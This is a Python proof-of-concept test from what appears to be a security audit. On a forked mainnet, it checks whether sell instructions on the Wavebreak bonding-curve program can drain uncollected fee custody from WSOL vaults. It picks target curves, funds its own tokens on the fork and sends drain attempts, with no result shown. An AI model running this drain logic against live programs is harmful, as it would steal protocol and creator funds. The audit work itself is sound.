"""Wavebreak fee-excess drain test.

Live state (recon/wb_custody_full.json, read-only mainnet RPC) shows many curves whose WSOL
vault holds MORE than the curve's internal `quoteAmount` accounting. The excess is uncollected
protocol/creator fee custody (collectable only via BondingCurveCollectFees by a privileged
fee authority, 6027 for anyone else).

Question: can a permissionless SELL extract that excess - i.e. is the payout capped by the
*accounting* or by the *vault balance*, and does `allow_partial_fill=true` change that?
"""
import sys, json, struct, base64
sys.path.insert(0, "/home/user/orca-audit/tools")
import forknet as F
from solders.instruction import Instruction
from solders.pubkey import Pubkey

WB = "waveQX2yP3H1pVU8djGvEHmYg8uamQ84AuyGtpsrXTF"
WSOL = F.WSOL
actor = F.load_actor()
A = str(actor.pubkey())
ATA_WSOL = "HMRvmgya8xKgDsbZfLGrYEjGNeFrJSe27JBhsAE2P7jh"
CURVES = {c["address"]: c for c in json.load(open("/home/user/orca-audit/recon/wb_curves.json"))}
CUST = {r["curve"]: r for r in json.load(open("/home/user/orca-audit/recon/wb_custody_full.json"))}


def ata_of(owner, mint, prog=F.TOKEN):
    return str(Pubkey.find_program_address([bytes(F.pk(owner)), bytes(F.pk(prog)), bytes(F.pk(mint))],
                                           F.pk(F.ATA))[0])


def ix(tag, metas, data=b""):
    return Instruction(F.pk(WB), bytes([tag]) + data, metas)


def M(k, w=False, s=False):
    return F.AM(k, writable=w, signer=s)


def sell(curve, mint, vault, base_ata, quote_ata, amount, partial, thr=None, tag=10):
    d = struct.pack("<QB", amount & (2**64 - 1), partial)
    d += b"\x00" if thr is None else (b"\x01" + struct.pack("<QQ", *thr))
    return ix(tag, [M(A, w=True, s=True), M(curve, w=True), M(mint, w=True), M(base_ata, w=True),
                    M(WSOL), M(vault, w=True), M(quote_ata, w=True), M(F.SYSTEM), M(F.ATA),
                    M(F.TOKEN), M(F.TOKEN)], d)


def main():
    # candidates: WSOL quote, not graduated, biggest positive vault-accounting divergence
    cand = []
    for a, c in CURVES.items():
        if c["quote_mint"] != WSOL or any(m["graduated"] for m in c["graduation_methods"]):
            continue
        r = CUST.get(a, {})
        if r.get("divQuote", 0) > 10 ** 8:
            cand.append((r["divQuote"], a, r["vaultQuote"], r["acctQuote"]))
    cand.sort(reverse=True)
    print("top positive-divergence curves (unaccounted SOL in vault):")
    for x in cand[:6]:
        print(f"   {x[1]:44s} vault={x[2]:>14,} acct={x[3]:>10,} excess={x[0]:>14,} ({x[0]/1e9:.4f} SOL)")
    div, T, vault_amt, acct_amt = cand[0]
    c = CURVES[T]
    BASE = c["base_mint"]
    VAULT = ata_of(T, WSOL)
    base_ata = ata_of(A, BASE)
    print(f"\nTARGET curve={T}\n  baseMint={BASE}\n  vault={VAULT} (balance {vault_amt:,}) acct quote={acct_amt:,}")
    print(f"  curve fields: swapFee={c['swap_fee_bps']} quoteFee={c['quote_fee_bps']} baseFee={c['base_fee_bps']}"
          f" creatorReward={c['creator_reward']} gradTarget={c['graduation_target']} launch={c['launch_time']}"
          f" gradTime={c['graduation_time']} minReserve={c['min_reserve_bps']}")

    _, ixc = F.create_ata(A, BASE, F.TOKEN, A)
    r = F.send([ixc], actor)
    print("create base ATA:", json.dumps((r.get("detail") or {}).get("err")))

    # fork-only fixture funding: attacker's own base ATA + mint supply so the sell math runs
    mv = F.get_account(BASE)
    mraw = bytearray(base64.b64decode(mv["data"][0]))
    supply0 = struct.unpack_from("<Q", mraw, 36)[0]
    dec = mraw[44]
    fund = 10 ** (dec + 6)          # a million tokens - enough that the curve math wants everything
    v2 = bytearray(base64.b64decode(F.get_account(base_ata)["data"][0]))
    struct.pack_into("<Q", v2, 64, fund)
    F.rpc.rpc("surfnet_setAccount", [base_ata, {"lamports": 2039280, "data": bytes(v2).hex(),
                                                "owner": F.TOKEN, "executable": False}], url=F.FORK)
    F.rpc.rpc("surfnet_setSupply", [BASE, {"total": str(supply0 + fund)}], url=F.FORK)
    funding = {"note": "FORK-ONLY fixture funding of the ATTACKER'S OWN base ATA (+ mint supply so the burn "
                       "is legal). Purpose: make the payout measurable. Not exploit evidence by itself.",
               "curve": T, "mint": BASE, "ata": base_ata, "decimals": dec, "funded": fund,
               "supplyBefore": supply0, "forkSlot": F.get_slot()}
    json.dump(funding, open("/home/user/orca-audit/evidence/funding_drain.json", "w"), indent=1)

    watch = [A, ATA_WSOL, base_ata, T, VAULT, BASE]

    def show(name, ixs, note=""):
        before = F.snapshot(watch, tokenaddrs=set(watch), mints={BASE})
        sb = F.get_slot()
        r = F.send(ixs, actor)
        after = F.snapshot(watch, tokenaddrs=set(watch), mints={BASE})
        d = F.diff(before, after)
        det = r.get("detail", {})
        logs = [l.strip() for l in det.get("logs", [])]
        att_wsol_before = (before.get(ATA_WSOL) or {}).get("token", {}).get("amount") or 0
        att_wsol_after = (after.get(ATA_WSOL) or {}).get("token", {}).get("amount") or 0
        vb = (before.get(VAULT) or {}).get("token", {}).get("amount") or 0
        va = (after.get(VAULT) or {}).get("token", {}).get("amount") or 0
        rec = {"case": name, "note": note, "forkSlotBefore": sb, "forkSlotAfter": F.get_slot(),
               "sig": r.get("result"), "txErr": det.get("err") or r.get("error"), "logs": logs,
               "attackerWsolBefore": att_wsol_before, "attackerWsolAfter": att_wsol_after,
               "attackerWsolDelta": att_wsol_after - att_wsol_before,
               "vaultBefore": vb, "vaultAfter": va, "vaultDelta": va - vb,
               "curveAcctQuoteBefore": (before.get(T) or {}).get("dataHash"),
               "curveAcctQuoteAfter": (after.get(T) or {}).get("dataHash"),
               "stateDiff": d,
               "rawBefore": {k: {kk: vv for kk, vv in v.items() if kk in ("lamports", "token", "mint")}
                             for k, v in before.items()},
               "rawAfter": {k: {kk: vv for kk, vv in v.items() if kk in ("lamports", "token", "mint")}
                            for k, v in after.items()}}
        RESULTS.append(rec)
        print(f"\n### {name}   {note}")
        print("   err:", json.dumps(rec["txErr"])[:150])
        print("   logs:", " | ".join(l.split('log:')[-1].strip() for l in logs if 'log:' in l or 'failed' in l)[:260])
        print(f"   attacker WSOL delta: {rec['attackerWsolDelta']:+,}   vault delta: {rec['vaultDelta']:+,}")
        print(f"   curve acct quote before/after: {acct_amt:,} -> now {va and (after[T].get('dataHash') or '')[:8]}")
        return rec

    RESULTS = []
    show("WB-D01 sell HUGE amount, allow_partial_fill=FALSE",
         [sell(T, BASE, VAULT, base_ata, ATA_WSOL, fund, 0)],
         "expect: capped payout must revert (6025) rather than pay the vault dry")
    show("WB-D02 sell HUGE amount, allow_partial_fill=TRUE",
         [sell(T, BASE, VAULT, base_ata, ATA_WSOL, fund, 1)],
         "KEY TEST: does a partial fill pay out beyond internal accounting (fee custody)?")
    show("WB-D03 sell exact-out for the whole vault, partial=TRUE",
         [sell(T, BASE, VAULT, base_ata, ATA_WSOL, vault_amt, 1, tag=11)],
         "exact-out asking for the entire vault balance")
    show("WB-D04 repeated WB-D02 in one tx x3",
         [sell(T, BASE, VAULT, base_ata, ATA_WSOL, fund, 1),
          sell(T, BASE, VAULT, base_ata, ATA_WSOL, fund, 1),
          sell(T, BASE, VAULT, base_ata, ATA_WSOL, fund, 1)],
         "state carry-over across repeated payout instructions")
    json.dump({"target": {"curve": T, "baseMint": BASE, "vault": VAULT, "vaultBefore": vault_amt,
                          "acctQuote": acct_amt, "excess": div, "curve": c},
               "funding": funding, "results": RESULTS},
              open("/home/user/orca-audit/evidence/WBD_fee_drain.json", "w"), indent=1)
    print("\n==== saved evidence/WBD_fee_drain.json")


if __name__ == "__main__":
    main()
